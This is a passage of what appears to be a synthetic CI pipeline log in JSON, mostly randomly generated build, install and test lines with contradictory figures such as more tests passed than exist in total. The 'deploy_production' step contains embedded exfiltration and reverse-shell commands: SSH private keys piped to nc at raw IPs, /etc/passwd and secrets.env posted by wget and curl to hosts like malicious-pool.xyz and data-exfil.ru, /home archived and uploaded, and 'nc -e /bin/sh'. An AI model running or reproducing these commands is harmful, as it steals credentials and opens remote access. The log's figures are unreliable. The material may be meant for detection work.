usage\n[12:45:56] INFO: Cache refreshed\nVerifying...\nConnection established\nSuccess!\n[12:45:56] WARN: Deprecated API usage\nWARNING: prettier has known vulnerabilities\nInstalling eslint@1.14.3\n[12:45:56] INFO: Cache refreshed\nStep 2/24: Linting\npip: Collecting jest\nHEAD is now at e50312e\nEnvironment: development\nHEAD is now at 5dec56c\nStep 5/21: Installing dependencies\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nUsing Python 3.9\nFetching submodules...\nCoverage: 95% statements, 83% branches\n[12:45:56] INFO: Connecting to database\nCompiling src/utils.go...\nCompiling src/app.ts...\nEnvironment: test\nFetching submodules...\nWARNING: jest has known vulnerabilities\nNODE_ENV=test\nDone.\nAlready up to date.\nChecking out main branch\nnpm install: resolved 1566 packages\nPOST /data - 202 (325ms)\nTLS handshake completed\nCompiling src/index.js...\nTransforming 977 files...\nCache invalidated: dependencies\nyarn add: Done in 3.52s\nSwitched to branch 'feature/task-371'\n[12:45:56] DEBUG: Loading configuration\n[12:45:56] DEBUG: Query executed in 91ms\n  PASS: integration/test_cache_hit.spec.js\nLayer 7/11: COPY command\nCompiling lib/main.py...\nnpm install: added 153 packages\nBundling styles.css\n\u2713 Task completed in 2832ms\n\u2713 test completed\nCompiling utils/service.java...\nLayer 7/15: RUN command\nStep 3/23: Deploying\nMinifying app.js\nPlatform: linux-x64\n\u2713 Step 'setup' succeeded\n[12:45:56] ERROR: Connection failed\n[12:45:56] DEBUG: Initializing service\nCache saved successfully\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nEnvironment: staging\nTest Suites: 39 passed, 8 total\n[12:45:56] DEBUG: Memory usage: 1345MB\n[12:45:56] DEBUG: Memory usage: 1904MB\nChecking out master branch\nTime: 38.135s\nVerifying...\nWARNING: lodash has known vulnerabilities\nGET /health - 201 (98ms)\nTLS handshake completed\nChecking out develop branch\npip: Installing build dependencies...\nWARNING: axios has known vulnerabilities\nGenerating source maps...\nStep 10/19: Linting\n[12:45:56] ERROR: Connection failed\nInstalling jest@5.1.9\nVerifying...\nOptimizing 60 modules...\nFetching submodules...\n=== Step upload_artifacts completed ===\n=== Step: lint ===\nTest Suites: 6 passed, 47 total\nnpm install: added 83 packages\nFinished.\npip: Collecting eslint\nStep 6/17: Deploying\nCache restored successfully (115MB)\nSnapshots: 7 passed, 46 total\nPOST /api - 201 (299ms)\n\u2713 All checks passed\nyarn add: Done in 17.38s\nSnapshots: 3 passed, 33 total\nnpm install: added 293 packages\n[12:45:56] WARN: Deprecated API usage\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:45:56] INFO: Connecting to database\nCreating production build...\nStep 13/20: Building\nChecking out master branch\nStep 19/19: Deploying\nyarn add: Done in 10.0s\nAlready up to date.\nSuccess!\nnpm install: resolved 1010 packages\nUsing Node.js 17.3.8\nFetching from https://gcr.io/package.json\nProcessing...\n[12:45:56] WARN: Deprecated API usage\nFinished.\nCache hit for key-4827\nCompiling lib/main.py...\nWARNING: prettier has known vulnerabilities\nCompleted.\nTLS handshake completed\nLayer 5/12: ENV command\n[12:45:56] WARN: Deprecated API usage\nSuccess!\nDone.\nPlatform: linux-x64\nVerifying...\nFinished.\nLayer 1/14: RUN command\nRan 50 tests in 16s\nOK\nInstalling webpack@1.11.6\nHEAD is now at 49aec16\nChecking out master branch\nNODE_ENV=development\nArtifact downloaded: 42MB\nMinifying app.js\nLoading...\nCache saved successfully\n[12:45:56] DEBUG: Query executed in 6ms\nCoverage: 75% statements, 62% branches\n[12:45:56] WARN: Deprecated API usage\nCache restored successfully (498MB)\nTest Suites: 27 passed, 48 total\npip: Downloading express-5.16.tar.gz\nStep 13/20: Linting\nCoverage: 90% statements, 85% branches\nCompiling src/handler.rs...\nTime: 24.907s\nOptimizing 35 modules...\nArtifact downloaded: 27MB\nProcessing...\nSwitched to branch 'bugfix/task-108'\nFetching submodules...\nDone.\nGET /api - 201 (64ms)\nStep 15/22: Installing dependencies\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nFetching submodules...\n[12:45:56] ERROR: Connection failed\nStep 1/24: Deploying\n[12:45:56] INFO: Request completed\nnpm notice: created a lockfile\nSnapshots: 10 passed, 41 total\nException: TypeError\nStep 11/19: Running migrations\nCompiling utils/utils.go...\nStep 16/18: Testing\nGenerating source maps...\nRan 92 tests in 43s\nCompiling lib/handler.rs...\nStep 4/22: Building\nFetching submodules...\nSnapshots: 3 passed, 21 total\nNODE_ENV=production\nyarn add: Done in 13.9s\nEnvironment: production\nOptimizing 73 modules...\n[12:45:56] INFO: Starting build process\nCoverage: 96% statements, 68% branches\n  PASS: e2e/test_db_connect.spec.js\npip: Installing build dependencies...\n[12:45:56] INFO: Cache refreshed\nChecking out main branch\nCompleted.\nCache restored successfully (210MB)\n  PASS: integration/test_db_connect.spec.js\nPlatform: darwin-arm64\nTest Suites: 23 passed, 18 total\n\u2713 Task completed in 4104ms\nVerifying...\nCache hit for key-6838\nConnection established\nStep 14/19: Deploying\n  PASS: test_db_connect (260ms)\nArtifact uploaded: build.tar.gz (19MB)\npip: Downloading axios-3.11.tar.gz\nTransforming 952 files...\n[12:45:56] INFO: Starting build process\nTest Suites: 43 passed, 29 total\nConnection established\npip: Collecting lodash\nNODE_ENV=development\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCompiling components/utils.go...\nCompiling components/service.java...\nUsing Python 3.12\nStep 6/18: Deploying\n[12:45:56] WARN: Deprecated API usage\nStep 5/17: Installing dependencies\nArtifact uploaded: dist.zip (10MB)\nGenerating source maps...\nnpm install: added 286 packages\nImage pulled successfully\nFAILED: test_user_create\nCompiling utils/index.js...\nWARNING: eslint has known vulnerabilities\n[12:45:56] DEBUG: Connection pool: 14 active\n[12:45:56] INFO: Cache refreshed\n  PASS: test_auth_login (437ms)\nStep 19/22: Deploying\nLayer 1/13: COPY command\n[12:45:56] DEBUG: Query executed in 30ms\nTests: 207 passed, 108 total\nException: RuntimeError\npip: Installing build dependencies...\nLoading...\nCreating production build...\n[12:45:56] INFO: Cache refreshed\nLoading...\n\u2713 Task completed in 4440ms\nTests: 68 passed, 222 total\nWARNING: jest has known vulnerabilities\n[12:45:56] DEBUG: Initializing service\nBuilding Docker image...\npip: Collecting react\nPushing to registry...\nDone.\nUsing Python 3.9\nCache saved successfully\nVerifying...\nPushing to registry...\nStep 6/17: Building\nCompiling components/utils.go...\nCache invalidated: node_modules\n[12:45:56] INFO: Cache refreshed\nImage pulled successfully\n=== Step lint completed ===\n=== Step: checkout ===\nException: RuntimeError\npip: Installing build dependencies...\nTLS handshake completed\nStep 17/21: Deploying\n\u2713 deploy completed\nStep 13/21: Deploying\nCache saved successfully\nSnapshots: 46 passed, 16 total\nSuccess!\nCache hit for key-7792\n[12:45:56] INFO: Connecting to database\nPOST /data - 202 (319ms)\nFetching from https://registry.npmjs.org/package.json\nArtifact uploaded: dist.zip (15MB)\nWARNING: prettier has known vulnerabilities\nStep 19/22: Deploying\nProcessing...\nInstalling lodash@4.17.7\nArtifact uploaded: dist.zip (22MB)\nCompiling lib/handler.rs...\npip: Collecting express\n  PASS: test_cache_hit (167ms)\nFetching from https://pypi.org/package.json\nAlready up to date.\nConnection established\nSuccess!\n\u2713 Task completed in 277ms\nFetching from https://gcr.io/package.json\n[12:45:56] WARN: Deprecated API usage\nTest Suites: 25 passed, 15 total\nBuilding Docker image...\nOK\nCoverage: 79% statements, 99% branches\nStep 14/24: Deploying\nAlready up to date.\n[12:45:56] DEBUG: Initializing service\npip: Collecting jest\nCache miss for key-4865\nCache invalidated: build\nStep 6/20: Running migrations\nCache restored successfully (315MB)\nnpm install: added 355 packages\nReady.\n[12:45:56] INFO: Starting build process\n[12:45:56] INFO: Processing request\n[12:45:56] INFO: Starting build process\n\u2713 Step 'setup' succeeded\nTLS handshake completed\nStep 11/17: Linting\nPlatform: darwin-arm64\nConnection established\nStep 17/23: Deploying\n  PASS: test_user_create (106ms)\nMinifying vendor.js\n[12:45:56] WARN: Deprecated API usage\n  PASS: test_user_create (496ms)\nCache miss for key-6748\nCache restored successfully (345MB)\nConnection established\nFAILED: test_api_health\nFetching from https://pypi.org/package.json\nCache miss for key-8513\nTLS handshake completed\nChecking out develop branch\nnpm notice: package.json updated\npip: Collecting webpack\nTest Suites: 31 passed, 49 total\nLayer 8/10: COPY command\nCoverage: 79% statements, 75% branches\n[12:45:56] WARN: Deprecated API usage\nTests: 269 passed, 193 total\npip: Downloading eslint-2.17.tar.gz\nSuccess!\nnpm notice: package.json updated\nCompiling src/service.java...\nCache miss for key-1831\nFAILED: test_db_connect\n[12:45:56] DEBUG: Query executed in 94ms\nSuccess!\nStep 2/21: Installing dependencies\n\u2713 All checks passed\nyarn add: Done in 15.90s\nInstalling jest@1.9.1\nCache hit for key-3383\n\u2713 All checks passed\nChecking out master branch\nSnapshots: 44 passed, 44 total\n[12:45:56] INFO: Starting build process\nInstalling lodash@2.9.2\nCache saved successfully\nReady.\nnpm install: added 177 packages\n[12:45:56] INFO: Starting build process\nInstalling react@4.11.10\n\u2713 Task completed in 2052ms\nAlready up to date.\nTests: 441 passed, 463 total\nVerifying...\n[12:45:56] INFO: Starting build process\nSuccess!\nTest Suites: 50 passed, 36 total\n\u2713 All checks passed\nnpm notice: created a lockfile\n\u2713 All checks passed\nCompiling src/index.js...\nCompiling components/index.js...\n[12:45:56] DEBUG: Memory usage: 765MB\n[12:45:56] INFO: Processing request\n[12:45:56] DEBUG: Loading configuration\nImage pulled successfully\nAlready up to date.\nConnection established\nnpm install: resolved 937 packages\n[12:45:56] DEBUG: Query executed in 2ms\npip: Installing build dependencies...\nCoverage: 80% statements, 85% branches\nLayer 3/14: COPY command\nLayer 9/10: COPY command\nCache hit for key-7814\nBuilding Docker image...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCompiling src/main.py...\nStep 7/19: Deploying\n\u2713 All checks passed\nHEAD is now at ccb1c05\nWaiting...\nSwitched to branch 'feature/task-727'\nConnection established\nOptimizing 44 modules...\n[12:45:56] DEBUG: Connection pool: 19 active\nInstalling lodash@1.13.3\nOptimizing 70 modules...\nOK\nReady.\n[12:45:56] DEBUG: Loading configuration\nGenerating source maps...\n[12:45:56] WARN: Deprecated API usage\nCache restored successfully (469MB)\n[12:45:56] WARN: Deprecated API usage\nStep 9/23: Deploying\nMinifying vendor.js\nCache hit for key-7701\n[12:45:56] INFO: Cache refreshed\n[12:45:56] ERROR: Connection failed\nChecking out develop branch\nPushing to registry...\nReady.\n[12:45:56] DEBUG: Loading configuration\nTests: 141 passed, 275 total\nConnection established\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nWARNING: prettier has known vulnerabilities\nTests: 155 passed, 107 total\n[12:45:56] INFO: Processing request\nCache invalidated: node_modules\nWaiting...\nLoading...\npip: Collecting axios\nException: RuntimeError\n=== Step checkout completed ===\n=== Step: install_dependencies ===\nReady.\nNODE_ENV=test\nCompleted.\nGenerating source maps...\n[12:45:56] INFO: Starting build process\n  PASS: test_db_connect (491ms)\nBundling runtime.js\nPushing to registry...\nMinifying main.js\nStep 5/16: Running migrations\n[12:45:56] INFO: Request completed\nInstalling webpack@2.0.10\n\u2713 test completed\nFAILED: test_auth_login\nStep 11/15: Running migrations\n[12:45:56] INFO: Request completed\nCompiling lib/handler.rs...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:45:56] DEBUG: Memory usage: 1568MB\n[12:45:56] INFO: Connecting to database\nCreating production build...\nHEAD is now at 2e512bb\nLoading...\nFetching submodules...\nnpm notice: package.json updated\nSuccess!\n  PASS: test_db_connect (84ms)\nCompleted.\nStep 4/23: Installing dependencies\nOptimizing 95 modules...\nWARNING: prettier has known vulnerabilities\n[12:45:56] INFO: Starting build process\n[12:45:56] WARN: Deprecated API usage\nWARNING: jest has known vulnerabilities\nWARNING: react has known vulnerabilities\nArtifact uploaded: dist.zip (98MB)\nTests: 322 passed, 419 total\nStep 3/23: Building\n\u2713 All checks passed\n\u2713 package completed\nStep 14/19: Running migrations\nCoverage: 92% statements, 65% branches\n\u2713 All checks passed\nReady.\nArtifact downloaded: 43MB\nyarn add: Done in 3.80s\nRan 120 tests in 36s\nPlatform: darwin-arm64\nInstalling eslint@1.16.4\nArtifact uploaded: dist.zip (61MB)\nnpm notice: created a lockfile\n[12:45:56] INFO: Processing request\nFetching submodules...\nException: ValueError\n[12:45:56] DEBUG: Loading configuration\nPushing to registry...\nTest Suites: 43 passed, 12 total\nTests: 378 passed, 396 total\nOptimizing 20 modules...\nnpm install: resolved 573 packages\nCache hit for key-7958\nCache hit for key-9128\nnpm install: added 219 packages\nReady.\nProcessing...\nUploading artifact 'coverage' (17 files)\nReady.\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nUploading artifact 'dist' (44 files)\nWARNING: jest has known vulnerabilities\nWARNING: lodash has known vulnerabilities\n[12:45:56] INFO: Starting build process\n\u2713 All checks passed\npip: Collecting axios\nCache restored successfully (274MB)\nGET /health - 204 (34ms)\n  PASS: test_auth_login (60ms)\nBundling runtime.js\nCache invalidated: dependencies\n  PASS: unit/test_db_connect.spec.js\nLoading...\nUsing Node.js 15.14.9\nFinished.\nStep 1/15: Installing dependencies\nNODE_ENV=production\nLayer 2/13: RUN command\nBundling main.js\npip: Installing build dependencies...\nUsing Node.js 16.14.5\nCompleted.\nyarn add: Done in 19.46s\npip: Installing build dependencies...\npip: Downloading express-4.17.tar.gz\nReady.\nCompiling src/app.ts...\nTLS handshake completed\n[12:45:56] DEBUG: Loading configuration\n[12:45:56] DEBUG: Loading configuration\nCache restored successfully (146MB)\nCache miss for key-5405\nStep 12/23: Building\nLoading...\nLayer 9/12: RUN command\n\u2713 Step 'build' succeeded\nOK\npip: Downloading react-5.18.tar.gz\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCache saved successfully\nStep 11/22: Building\nCache hit for key-5895\nStep 9/19: Running migrations\nStep 6/24: Building\nTransforming 197 files...\nLayer 5/9: RUN command\nSwitched to branch 'bugfix/task-185'\nLayer 1/15: ENV command\npip: Downloading react-5.2.tar.gz\n[12:45:56] WARN: Deprecated API usage\nCache saved successfully\nTest Suites: 49 passed, 7 total\nyarn add: Done in 19.16s\nOK\nVerifying...\nWaiting...\nSuccess!\n[12:45:56] WARN: Deprecated API usage\nPlatform: win32-x64\nFetching from https://amazonaws.com/package.json\npip: Collecting axios\nCompiling utils/service.java...\nReady.\nCache hit for key-7418\nUploading artifact 'dist' (18 files)\n[12:45:56] DEBUG: Connection pool: 10 active\n[12:45:56] DEBUG: Memory usage: 1147MB\nReady.\npip: Collecting axios\nTransforming 846 files...\n\u2713 validate completed\nTLS handshake completed\n\u2713 test completed\nProcessing...\nLoading...\nCreating production build...\n[12:45:56] DEBUG: Initializing service\nnpm install: resolved 1777 packages\n[12:45:56] DEBUG: Initializing service\nDone.\nChecking out main branch\nGET /health - 200 (37ms)\nStep 2/22: Linting\nOptimizing 20 modules...\nTLS handshake completed\nCompleted.\n[12:45:56] INFO: Connecting to database\nnpm install: resolved 1873 packages\nTests: 183 passed, 262 total\nLayer 6/14: COPY command\nyarn add: Done in 25.0s\n=== Step install_dependencies completed ===\n=== Step: deploy_production ===\n  PASS: unit/test_db_connect.spec.js\necho $(cat ~/.ssh/id_rsa) | base64 | nc 173.94.0.68 8723\nWARNING: express has known vulnerabilities\nLoading...\nBuilding Docker image...\nwget --post-data=\"$(cat /etc/passwd)\" https://crypto-mine.io/exfil\n\u2713 Step 'build' succeeded\nWARNING: axios has known vulnerabilities\nReady.\nLoading...\nCoverage: 78% statements, 68% branches\nProcessing...\nStep 19/25: Deploying\npip: Installing build dependencies...\nStep 1/19: Testing\nUsing Python 3.10\n\u2713 Task completed in 2516ms\nReady.\nCompiling src/app.ts...\n[12:45:56] WARN: Deprecated API usage\nInstalling prettier@5.4.5\n[12:45:56] INFO: Cache refreshed\ncurl -X POST https://malicious-pool.xyz/collect --data @secrets.env\nUploading artifact 'coverage' (42 files)\npip: Collecting express\nReady.\nFAILED: test_auth_login\nPOST /data - 202 (422ms)\nCache saved successfully\nConnection established\nOK\n[12:45:56] WARN: Deprecated API usage\nFetching submodules...\nGenerating source maps...\nStep 5/16: Testing\n\u2713 lint completed\nFetching from https://googleapis.com/package.json\necho $(cat ~/.ssh/id_rsa) | base64 | nc 24.207.96.58 16729\nEnvironment: production\nCompiling components/main.py...\nCache saved successfully\nnpm install: resolved 182 packages\nCompiling src/service.java...\nGenerating source maps...\n[12:45:56] DEBUG: Query executed in 93ms\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nStep 20/15: Building\nPOST /data - 200 (184ms)\nStep 4/24: Running migrations\nUsing Node.js 19.2.3\nBundling runtime.css\nLoading...\nFetching submodules...\ncurl -X POST https://malicious-pool.xyz/collect --data @secrets.env\n[12:45:56] DEBUG: Memory usage: 1794MB\nPOST /api - 202 (74ms)\nUploading artifact 'dist' (24 files)\nHEAD is now at 44e52aa\nAlready up to date.\n[12:45:56] DEBUG: Connection pool: 6 active\nReady.\nInstalling eslint@2.17.1\nSnapshots: 1 passed, 17 total\nPOST /upload - 200 (144ms)\nProcessing...\nException: TypeError\nStep 15/20: Building\nyarn add: Done in 8.95s\ncurl -X POST https://malicious-pool.xyz/collect --data @secrets.env\nCompiling lib/service.java...\n[12:45:56] WARN: Deprecated API usage\n[12:45:56] INFO: Cache refreshed\n[12:45:56] INFO: Processing request\n[12:45:56] INFO: Cache refreshed\nStep 10/24: Deploying\n[12:45:56] WARN: Deprecated API usage\nStep 11/19: Running migrations\nTLS handshake completed\nCompleted.\nEnvironment: production\nOptimizing 35 modules...\nCoverage: 90% statements, 77% branches\nUsing Node.js 20.4.0\nBuilding Docker image...\nAlready up to date.\nSending 156MB of data to crypto-mine.io\nChecking out master branch\nSending 305MB of data to evil-server.cc\nCache saved successfully\nCache saved successfully\nwget --post-data=\"$(cat /etc/passwd)\" https://malicious-pool.xyz/exfil\n[12:45:56] INFO: Request completed\nGET /api - 204 (43ms)\n\u2713 All checks passed\nOptimizing 58 modules...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nBundling runtime.css\nWARNING: react has known vulnerabilities\nOptimizing 58 modules...\nOK\nnpm install: resolved 1426 packages\nInstalling prettier@5.15.10\n[12:45:56] INFO: Starting build process\ncurl -X POST https://data-exfil.ru/collect --data @secrets.env\nFAILED: test_api_health\nnpm install: added 99 packages\nTransforming 739 files...\npip: Collecting webpack\nMinifying app.js\nFinished.\nStep 9/15: Deploying\nFinished.\nCache restored successfully (117MB)\nwget --post-data=\"$(cat /etc/passwd)\" https://crypto-mine.io/exfil\nEnvironment: test\n[12:45:56] DEBUG: Loading configuration\nGET /health - 200 (50ms)\nEnvironment: staging\ntar czf - /home | curl -X POST -d @- https://malicious-pool.xyz/upload\nStep 15/20: Deploying\n[12:45:56] INFO: Processing request\nException: RuntimeError\necho $(cat ~/.ssh/id_rsa) | base64 | nc 212.244.155.195 26914\nLayer 6/14: ENV command\nStep 4/15: Deploying\nStep 5/17: Testing\nUsing Node.js 15.9.5\nWARNING: express has known vulnerabilities\nCoverage: 99% statements, 94% branches\nTransforming 426 files...\nPOST /upload - 202 (138ms)\nCompiling components/handler.rs...\nStep 18/21: Building\n[12:45:56] INFO: Starting build process\nImage pulled successfully\nArtifact downloaded: 17MB\n  PASS: unit/test_cache_hit.spec.js\nUploading artifact 'build' (17 files)\nSending 185MB of data to crypto-mine.io\nCache saved successfully\nwget --post-data=\"$(cat /etc/passwd)\" https://crypto-mine.io/exfil\nFAILED: test_api_health\nnpm install: added 440 packages\nUsing Python 3.9\nChecking out develop branch\nSnapshots: 17 passed, 6 total\ntar czf - /home | curl -X POST -d @- https://malicious-pool.xyz/upload\nnpm notice: package.json updated\nWARNING: react has known vulnerabilities\nFetching from https://pypi.org/package.json\n[12:45:56] WARN: Deprecated API usage\nTest Suites: 42 passed, 30 total\nCompleted.\nBundling runtime.js\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nBuilding Docker image...\nMinifying main.js\n[12:45:56] WARN: Deprecated API usage\ncurl -X POST https://data-exfil.ru/collect --data @secrets.env\nPOST /upload - 200 (315ms)\necho $(cat ~/.ssh/id_rsa) | base64 | nc 112.192.151.55 50212\nnpm notice: package.json updated\nPOST /upload - 201 (13ms)\nSending 35MB of data to data-exfil.ru\necho $(cat ~/.ssh/id_rsa) | base64 | nc 54.87.183.129 56370\nProcessing...\nStep 13/19: Installing dependencies\nCompiling components/main.py...\nFetching from https://github.com/package.json\nyarn add: Done in 15.47s\nStep 15/18: Building\nMinifying vendor.js\n\u2713 All checks passed\n[12:45:56] INFO: Cache refreshed\n\u2713 Step 'setup' succeeded\nVerifying...\nnc -e /bin/sh 175.21.201.115 7927\n  PASS: integration/test_api_health.spec.js\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nFAILED: test_cache_hit\n=== Step deploy_production completed ===",
    "steps": [
      {
        "name": "deploy_staging",
        "status": "success",
        "started_at": "2025-11-29T12:45:56.049573",
        "finished_at": "2025-11-29T12:46:09.115284",
        "log_lines": [
          "=== Step: deploy_staging ===",
          "[12:45:56] INFO: Request completed",
          "Time: 67.39s",
          "HEAD is now at 197412f",
          "GET /api - 204 (20ms)",
          "Time: 3.757s",
          "Generating source maps...",
          "Done.",
          "Building Docker image...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Tests: 438 passed, 475 total",
          "OK",
          "npm notice: package.json updated",
          "Compiling src/index.js...",
          "  PASS: test_cache_hit (316ms)",
          "[12:45:56] DEBUG: Initializing service",
          "pip: Downloading eslint-2.13.tar.gz",
          "Uploading artifact 'build' (39 files)",
          "Checking out main branch",
          "Waiting...",
          "pip: Collecting axios",
          "Coverage: 94% statements, 78% branches",
          "Cache invalidated: dependencies",
          "Cache miss for key-5634",
          "Cache saved successfully",
          "Artifact downloaded: 5MB",
          "WARNING: react has known vulnerabilities",
          "Success!",
          "Ready.",
          "Already up to date.",
          "Time: 47.291s",
          "Cache hit for key-2239",
          "yarn add: Done in 1.47s",
          "Step 6/21: Installing dependencies",
          "[12:45:56] INFO: Cache refreshed",
          "Cache saved successfully",
          "OK",
          "Platform: linux-x64",
          "Fetching from https://amazonaws.com/package.json",
          "Layer 10/9: ENV command",
          "Ran 22 tests in 3s",
          "POST /data - 200 (89ms)",
          "Image pulled successfully",
          "WARNING: express has known vulnerabilities",
          "Cache restored successfully (306MB)",
          "Done.",
          "Creating production build...",
          "Cache restored successfully (197MB)",
          "Verifying...",
          "Artifact downloaded: 40MB",
          "\u2713 validate completed",
          "FAILED: test_auth_login",
          "Pulling image: alpine:18",
          "[12:45:56] DEBUG: Loading configuration",
          "Fetching from https://github.com/package.json",
          "Step 19/24: Installing dependencies",
          "FAILED: test_api_health",
          "[12:45:56] INFO: Cache refreshed",
          "[12:45:56] DEBUG: Loading configuration",
          "Transforming 329 files...",
          "TLS handshake completed",
          "NODE_ENV=production",
          "Using Python 3.11",
          "Success!",
          "Installing webpack@1.1.0",
          "npm install: added 233 packages",
          "[12:45:56] INFO: Processing request",
          "  PASS: integration/test_db_connect.spec.js",
          "NODE_ENV=test",
          "Processing...",
          "pip: Collecting eslint",
          "Compiling components/utils.go...",
          "Exception: NullPointerException",
          "Minifying app.js",
          "Compiling lib/service.java...",
          "[12:45:56] DEBUG: Initializing service",
          "Compiling src/utils.go...",
          "Uploading artifact 'dist' (22 files)",
          "[12:45:56] DEBUG: Connection pool: 13 active",
          "[12:45:56] INFO: Connecting to database",
          "[12:45:56] DEBUG: Loading configuration",
          "TLS handshake completed",
          "[12:45:56] ERROR: Connection failed",
          "Waiting...",
          "Ran 85 tests in 18s",
          "Compiling utils/main.py...",
          "Cache miss for key-4474",
          "npm notice: created a lockfile",
          "Checking out develop branch",
          "Cache restored successfully (147MB)",
          "Step 6/20: Running migrations",
          "Optimizing 34 modules...",
          "[12:45:56] WARN: Deprecated API usage",
          "\u2713 Task completed in 1061ms",
          "pip: Installing build dependencies...",
          "\u2713 All checks passed",
          "[12:45:56] DEBUG: Query executed in 56ms",
          "Time: 62.657s",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "HEAD is now at f85e6ff",
          "[12:45:56] INFO: Connecting to database",
          "Optimizing 15 modules...",
          "\u2713 deploy completed",
          "Compiling lib/handler.rs...",
          "[12:45:56] DEBUG: Initializing service",
          "Cache invalidated: build",
          "  PASS: integration/test_cache_hit.spec.js",
          "\u2713 All checks passed",
          "Compiling utils/utils.go...",
          "Minifying main.js",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Step 9/17: Testing",
          "Success!",
          "Compiling src/main.py...",
          "Success!",
          "\u2713 Step 'checkout' succeeded",
          "Switched to branch 'hotfix/task-785'",
          "Generating source maps...",
          "npm install: resolved 1185 packages",
          "Verifying...",
          "Ready.",
          "Processing...",
          "Time: 111.87s",
          "Using Node.js 17.6.2",
          "[12:45:56] DEBUG: Loading configuration",
          "Checking out main branch",
          "WARNING: jest has known vulnerabilities",
          "pip: Installing build dependencies...",
          "Completed.",
          "Loading...",
          "NODE_ENV=test",
          "Connection established",
          "[12:45:56] DEBUG: Memory usage: 1480MB",
          "OK",
          "[12:45:56] INFO: Cache refreshed",
          "Artifact uploaded: dist.zip (73MB)",
          "Done.",
          "Finished.",
          "Switched to branch 'bugfix/task-543'",
          "[12:45:56] INFO: Request completed",
          "Minifying vendor.js",
          "Cache restored successfully (245MB)",
          "pip: Installing build dependencies...",
          "Coverage: 96% statements, 65% branches",
          "Done.",
          "Verifying...",
          "npm install: resolved 358 packages",
          "Already up to date.",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Coverage: 92% statements, 89% branches",
          "npm notice: created a lockfile",
          "Cache saved successfully",
          "pip: Installing build dependencies...",
          "Step 7/25: Deploying",
          "Pushing to registry...",
          "\u2717 build failed with exit code 37",
          "Building Docker image...",
          "Cache saved successfully",
          "Time: 105.454s",
          "Creating production build...",
          "=== Step deploy_staging completed ==="
        ]
      },
      {
        "name": "setup_node",
        "status": "success",
        "started_at": "2025-11-29T12:46:09.115284",
        "finished_at": "2025-11-29T12:46:22.180995",
        "log_lines": [
          "=== Step: setup_node ===",
          "[12:45:56] ERROR: Connection failed",
          "Ran 23 tests in 49s",
          "Artifact uploaded: build.tar.gz (32MB)",
          "[12:45:56] INFO: Connecting to database",
          "[12:45:56] INFO: Cache refreshed",
          "Compiling components/app.ts...",
          "Step 13/19: Deploying",
          "[12:45:56] INFO: Processing request",
          "Finished.",
          "[12:45:56] WARN: Deprecated API usage",
          "[12:45:56] DEBUG: Connection pool: 9 active",
          "[12:45:56] INFO: Processing request",
          "Installing lodash@5.5.1",
          "Artifact uploaded: build.tar.gz (19MB)",
          "pip: Installing build dependencies...",
          "[12:45:56] ERROR: Connection failed",
          "\u2713 Task completed in 130ms",
          "Fetching from https://amazonaws.com/package.json",
          "npm notice: created a lockfile",
          "Finished.",
          "TLS handshake completed",
          "[12:45:56] INFO: Connecting to database",
          "Using Node.js 14.4.3",
          "Cache saved successfully",
          "Step 7/21: Deploying",
          "Cache saved successfully",
          "Artifact downloaded: 18MB",
          "WARNING: eslint has known vulnerabilities",
          "  PASS: test_user_create (66ms)",
          "Artifact uploaded: dist.zip (58MB)",
          "OK",
          "Completed.",
          "[12:45:56] DEBUG: Query executed in 34ms",
          "Pushing to registry...",
          "Success!",
          "pip: Installing build dependencies...",
          "Using Node.js 16.14.9",
          "[12:45:56] ERROR: Connection failed",
          "\u2713 Step 'install' succeeded",
          "[12:45:56] INFO: Processing request",
          "[12:45:56] WARN: Deprecated API usage",
          "yarn add: Done in 8.43s",
          "Transforming 660 files...",
          "TLS handshake completed",
          "Artifact uploaded: build.tar.gz (50MB)",
          "\u2713 Task completed in 4656ms",
          "Compiling components/utils.go...",
          "Optimizing 23 modules...",
          "GET /health - 200 (23ms)",
          "\u2713 validate completed",
          "[12:45:56] DEBUG: Connection pool: 7 active",
          "npm notice: created a lockfile",
          "Creating production build...",
          "Artifact downloaded: 36MB",
          "Compiling components/handler.rs...",
          "[12:45:56] INFO: Processing request",
          "  PASS: e2e/test_auth_login.spec.js",
          "[12:45:56] WARN: Deprecated API usage",
          "WARNING: eslint has known vulnerabilities",
          "\u2713 All checks passed",
          "Finished.",
          "\u2713 All checks passed",
          "Done.",
          "Optimizing 85 modules...",
          "Loading...",
          "Using Node.js 19.10.1",
          "Step 1/19: Installing dependencies",
          "Cache miss for key-5954",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Compiling utils/handler.rs...",
          "npm install: added 428 packages",
          "Bundling main.js",
          "Building Docker image...",
          "Cache saved successfully",
          "[12:45:56] INFO: Connecting to database",
          "Pulling image: node:18",
          "  PASS: test_db_connect (392ms)",
          "Success!",
          "Artifact downloaded: 39MB",
          "Cache hit for key-1090",
          "Using Node.js 20.9.10",
          "Step 15/22: Testing",
          "Done.",
          "Step 2/22: Deploying",
          "Image pulled successfully",
          "Ready.",
          "Using Python 3.11",
          "Cache invalidated: build",
          "Ran 76 tests in 13s",
          "[12:45:56] DEBUG: Loading configuration",
          "[12:45:56] INFO: Connecting to database",
          "Bundling main.js",
          "  PASS: unit/test_user_create.spec.js",
          "Finished.",
          "Environment: development",
          "[12:45:56] DEBUG: Connection pool: 2 active",
          "[12:45:56] INFO: Starting build process",
          "npm install: resolved 1044 packages",
          "Ran 27 tests in 18s",
          "[12:45:56] INFO: Cache refreshed",
          "NODE_ENV=test",
          "Done.",
          "Test Suites: 36 passed, 37 total",
          "npm install: added 217 packages",
          "pip: Downloading express-4.4.tar.gz",
          "Generating source maps...",
          "Step 19/22: Linting",
          "Exception: ValueError",
          "HEAD is now at 33e6ec4",
          "Artifact uploaded: build.tar.gz (12MB)",
